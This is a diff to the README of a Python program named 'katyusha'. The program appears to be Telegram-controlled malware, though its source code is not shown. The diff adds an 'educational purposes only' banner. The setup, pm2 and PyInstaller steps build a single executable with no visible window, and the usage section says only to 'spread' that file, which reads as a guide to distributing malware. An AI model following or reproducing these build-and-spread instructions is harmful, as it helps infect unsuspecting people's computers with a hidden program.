@@ -1,4 +1,6 @@
-# Development Setup
+# :information_source: EDUCATIONAL PURPOSES ONLY
+
+### Development Setup
 
 ```pip install aiogram ujson aiohttp[speedups]```
 
@@ -10,10 +12,10 @@
 
 ```pm2 start katyusha.py```
 
-# Build
+### Build
 
 ```pyinstaller --onefile --windowed --icon=katyusha.ico katyusha.py```
 
-# Usage
+### Usage
 
 Spread ```katyusha.exe``` inside dist folder.
